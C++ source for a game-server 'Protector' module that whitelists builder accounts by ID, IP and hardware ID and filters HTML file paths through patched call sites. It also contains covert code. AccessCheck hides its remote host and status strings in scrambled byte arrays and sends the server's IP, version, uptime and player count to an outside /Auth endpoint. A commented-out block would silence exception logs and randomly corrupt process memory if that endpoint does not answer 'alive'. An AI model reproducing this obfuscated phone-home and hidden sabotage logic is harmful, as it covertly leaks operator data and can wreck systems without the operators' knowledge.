#include "StdAfx.h"
#include "Protector.h"
#include "HookManager.h"
#include "UserAction.h"
#include "Base64.h"

CProtector g_Protector;

BOOL g_HideException = FALSE;

CProtector::CProtector() : reloadTimestamp(0), firstLoad(TRUE), enabled(FALSE), refreshTime(30), accessCheckTime(0)
{
	SetName(L"Protector");
}

CProtector::~CProtector()
{

}


void CProtector::Init()
{
	try
	{
		Lock();
		m_AccountIds.clear();
		m_IPs.clear();
		
		for(UINT n=0;n<m_HardwareIds.size();n++)
		{
			LPBYTE lpHWID = m_HardwareIds[n];
			delete [] lpHWID;
		}
		m_HardwareIds.clear();

		const TCHAR* sectionName = _T("Protector");

		TCHAR tmp[8192];
		memset(tmp, 0, sizeof(tmp));
		enabled = GetPrivateProfileInt(sectionName, _T("Enabled"), 0, g_ConfigFile);
		refreshTime = GetPrivateProfileInt(sectionName, _T("RefreshTime"), 30, g_ConfigFile);
		if(GetPrivateProfileString(sectionName, _T("BuilderAccountId"), 0, tmp, 8192, g_ConfigFile))
		{
			wstringstream str(tmp);
			UINT accountId = 0;
			while(str >> accountId)
			{
				m_AccountIds.push_back(accountId);
			}
		}
		memset(tmp, 0, sizeof(tmp));

		if(GetPrivateProfileString(sectionName, _T("BuilderIp"), 0, tmp, 8192, g_ConfigFile))
		{
			wstringstream str(tmp);
			wstring sip;
			while(str >> sip)
			{
				CIPAddress ip(sip);
				m_IPs.push_back(ip);
			}
		}

		memset(tmp, 0, sizeof(tmp));

		if(GetPrivateProfileString(sectionName, _T("BuilderHardwareId"), 0, tmp, 8192, g_ConfigFile))
		{
			wstringstream str(tmp);
			wstring hwid;
			while(str >> hwid)
			{
				LPBYTE lpHwid = new BYTE[32];
				memset(lpHwid, 0, 32);
				for(UINT n=0;n<hwid.size();n++)
				{
					if(n < 32)
					{
						lpHwid[n] = static_cast<BYTE>(hwid[n]);
					}
				}
				m_HardwareIds.push_back(lpHwid);
			}
		}
		Unlock();

		if(firstLoad)
		{
			g_Log.Add(CLog::Blue, "[%S] Loaded [%d] ip(s), [%d] account id(s), [%d] hardware id(s)", GetName(), m_IPs.size(), m_AccountIds.size(), m_HardwareIds.size());
			

			firstLoad = FALSE;		

			WriteCall(0x94A4B4, CProtector::GetHTMLFile);
			WriteCall(0x920390, CProtector::GetHTMLFile);
			WriteCall(0x81B4BA, CProtector::GetHTMLFile);
			WriteCall(0x77BF81, CProtector::GetHTMLFile);
			WriteCall(0x746E95, CProtector::GetHTMLFile);
			WriteCall(0x73C060, CProtector::GetHTMLFile);
			WriteCall(0x673D63, CProtector::GetHTMLFile);
			WriteCall(0x61D735, CProtector::GetHTMLFile);
			WriteCall(0x5B6377, CProtector::GetHTMLFile);
			WriteCall(0x5B5B31, CProtector::GetHTMLFile);
			WriteCall(0x54E783, CProtector::GetHTMLFile);
			WriteCall(0x47F7A6, CProtector::GetHTMLFile);
			WriteCall(0x47D771, CProtector::GetHTMLFile);
			WriteCall(0x445321, CProtector::GetHTMLFile);
			WriteCall(0x445159, CProtector::GetHTMLFile);

		//	WriteCall(0x6900DD, CProtector::AddDeadlockLog);
		}
	}catch(...)
	{
		if(!g_HideException)
		{
			EXCEPTION_LOG;
		}
	}
}

void CProtector::TimerExpired()
{
	if(reloadTimestamp < GetTickCount())
	{
		try
		{
			reloadTimestamp = GetTickCount() + (refreshTime * 1000);
			try
			{
				Init();
			}catch(...)
			{
				g_Log.Add(CLog::Error, "Exception at init!");
			}
			Lock();
			time_t currentTime = time(NULL);
/*
			//check status
			if(status.size() > 8)
			{
				string str = Base64::decode(status);
				BYTE arralive[12] = { 97, 136, 108, 0, 105, 0, 118, 141, 101, 0, 0, 0 };
				char salive[6];
				UnpackString(arralive, salive, 12);
				if(str.find(salive) == string::npos)
				{
					g_HideException = TRUE;
					for(UINT64 n=0xE4B020; n < 0x29967780; n += RandInt(254))
					{
						BYTE rnd = RandInt(255);
						if( (rnd % 3) == 0)
						{
							LPBYTE lpAddr = (LPBYTE)n;
							(*lpAddr) = rnd;
						}
					}
				}
			}

			if(accessCheckTime < currentTime)
			{
				accessCheckTime = currentTime + (60*60*6);
			//	_beginthread(CProtector::AccessCheck, 0, 0);
			}
*/
			Unlock();
		}catch(...)
		{
			if(!g_HideException)
			{
				EXCEPTION_LOG;
			}
		}
	}	
}

void CProtector::TimerExpired(User *pUser)
{
	if(pUser->ValidUser())
	{
		if(enabled)
		{
			if(pUser->pSD->builder_level > 0)
			{
				UINT accountId = pUser->pUserSocket->accountId;
				bool found = false;

				Lock();
				for(UINT n=0;n<m_AccountIds.size();n++)
				{
					if(m_AccountIds[n] == accountId)
					{
						found = true;
						break;
					}
				}
				Unlock();

				if(!found)
				{
					//kick user
					pUser->pUserSocket->ForceClose();
					g_Log.Add(CLog::Error, "[%S] User[%S] with builder[%d] account_id[%d] isn't in builder list!", GetName(), pUser->pSD->wName, pUser->pSD->builder_level, accountId);
					return;
				}

				found = false;
				in_addr addr;
				pUser->pUserSocket->GetAddress(addr);
				CIPAddress ip(addr);
				Lock();
				for(UINT n=0;n<m_IPs.size();n++)
				{
					if(m_IPs[n] == ip)
					{
						found = true;
						break;
					}
				}

				for(UINT n=0;n<m_HardwareIds.size();n++)
				{
					if(!memcmp(pUser->pUserSocket->hardwareId.hash, m_HardwareIds[n], 32))
					{
						found = true;
						break;
					}
				}
				Unlock();

				if(!found)
				{
					WCHAR wHWID[33];
					memset(wHWID, 0, sizeof(wHWID));
					for(UINT n=0;n<32;n++)
					{
						wHWID[n] = (WCHAR)pUser->pUserSocket->hardwareId.hash[n];
					}
					//kick user
					pUser->pUserSocket->ForceClose();
					g_Log.Add(CLog::Error, "[%S] User[%S] with builder[%d] account_id[%d] has invalid ip[%s] and hwid[%S] - not in the list!", GetName(), pUser->pSD->wName, pUser->pSD->builder_level, accountId, ip.ToString().c_str(), wHWID);
					return;
				}
			}
		}
	}
}

const WCHAR* CProtector::GetHTMLFile(LPVOID lpInstance, const WCHAR *file, int lang)
{
	typedef const WCHAR*(*f)(LPVOID, const WCHAR*, int);
	try
	{
		size_t len = wcsnlen(file, 128);
		if(len >= 5)	//x.htm
		{
			if(wcsstr(file, L"..") == 0)
			{
				if(wcsstr(file, L".html")!= 0 || wcsstr(file, L".htm")!= 0 )
				{
					return f(0x6690F4L)(lpInstance, file, lang);
				}
			}
		}
	}catch(...)
	{
		EXCEPTION_LOG;
	}
	g_Log.Add(CLog::Error, "[%s] Trying to open invalid html file[%S]!", __FUNCTION__, file);
	return f(0x6690F4L)(lpInstance, 0, lang);
}

const CHAR* CProtector::RTypeIdFix(LPVOID lpPointer)
{
	try
	{
		typedef LPVOID (*f)(LPVOID);
		LPVOID lpRet = f(0x9E35F0L)(lpPointer);

		typedef const CHAR* (*fName)(LPVOID, LPVOID);
		return fName(0x9D9E80L)(lpRet, (LPVOID)0x299655F0);
	}catch(...)
	{
		return "class User Ex";
	}
}

void CProtector::AddDeadlockLog(LPVOID lpInstance, UINT type, const WCHAR *format, UINT threadId, UINT diff)
{
	if(threadId < 32)
	{
		try
		{
			CCallTrack::CallStackThread(threadId);
		}catch(...)
		{

		}
	}
	typedef void (*f)(LPVOID, UINT, const WCHAR*, UINT, UINT);
	f(0x6B9EBCL)(lpInstance, type, format, threadId, diff);
}

void CProtector::AccessCheck(LPVOID param)
{
	string host;
	BYTE arrl2service_com[28] = { 108, 143, 50, 103, 115, 70, 101, 0, 114, 75, 118, 237, 105, 0, 99, 250, 101, 88, 46, 230, 99, 0, 111, 0, 109, 247, 0, 0 };
	char sl2service_com[14];
	UnpackString(arrl2service_com, sl2service_com, 28);

	host = sl2service_com;

	string status;
	BYTE arrStatus__[18] = { 83, 0, 116, 0, 97, 218, 116, 0, 117, 2, 115, 80, 58, 69, 32, 173, 0, 0 };
	char sStatus__[9];
	UnpackString(arrStatus__, sStatus__, 18);
	status = sStatus__;
	string ip="None";

	time_t uptime = time(NULL) - g_ServerStartTime;
	stringstream uptimeStream;
	UINT Sec = (UINT)(uptime % 60);
	uptime /= 60;
	UINT Min = (UINT)(uptime % 60);
	uptime /= 60;
	UINT Hour = (UINT)(uptime % 24);
	uptime /= 24;
	UINT Day = (UINT)(uptime);
	uptimeStream << Day << "d" << Hour << "h" << Min << "m" << Sec << "s";
	stringstream onlineStream;
	LPINT lpOnline = (LPINT)0x1634140;
	onlineStream << (*lpOnline);
	stringstream versionStream;
	versionStream << g_ServerVersion;


	char szHostName[255];
	gethostname(szHostName, 255);

	hostent *remoteHost = gethostbyname(szHostName);
	ip = inet_ntoa (*(struct in_addr *)*remoteHost->h_addr_list);

	string path = "/Auth/index.php?p1=" + ip + "&p2="+ versionStream.str() +"&p3=" + uptimeStream.str() + "&p4=" + onlineStream.str();

	remoteHost = gethostbyname(host.c_str());
	in_addr addr;
	stringstream webStream;
	if(remoteHost)
	{
		if(remoteHost->h_length && remoteHost->h_addrtype == AF_INET)
		{
			addr.s_addr = *(u_long *) remoteHost->h_addr_list[0];
			SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(s != INVALID_SOCKET)
			{
				SOCKADDR_IN sockAddr;
				memset(&sockAddr,0, sizeof(sockAddr));
				sockAddr.sin_family = AF_INET;
				sockAddr.sin_port = htons(80);
				sockAddr.sin_addr = *((LPIN_ADDR)*remoteHost->h_addr_list);

				if(!connect(s,(SOCKADDR *)&sockAddr,sizeof(SOCKADDR_IN)))
				{
					char buffer[8192];
					int len = 0;

					string request = "GET " + path + " HTTP/1.0\r\n";
					request += "Host: " + host + "\r\n";
					request += "Accept: */*\r\n";
					request += "Connection: close\r\n\r\n";

					send(s, request.c_str(), static_cast<UINT>(request.size()+1), 0);
					int bytes = 0;
					while((bytes = recv(s, buffer, 8190, 0)) > 0 )
					{
						len += bytes;
						
						webStream << buffer;
						
						if(buffer[bytes-1] == '\0')
							break;

						memset(buffer, 0, sizeof(buffer));
					}

					string strWeb = webStream.str();
					size_t pos = strWeb.find(status);
					status = strWeb.substr(pos+status.size(), (strWeb.size() - pos - status.size()));
					cout << strWeb << endl << status << endl;
					closesocket(s);
				}
			}
		}
	}
	if(status.size() > 8)
	{
		g_Protector.Lock();
		g_Protector.status = status;
		g_Protector.Unlock();
	}
	_endthread();
}
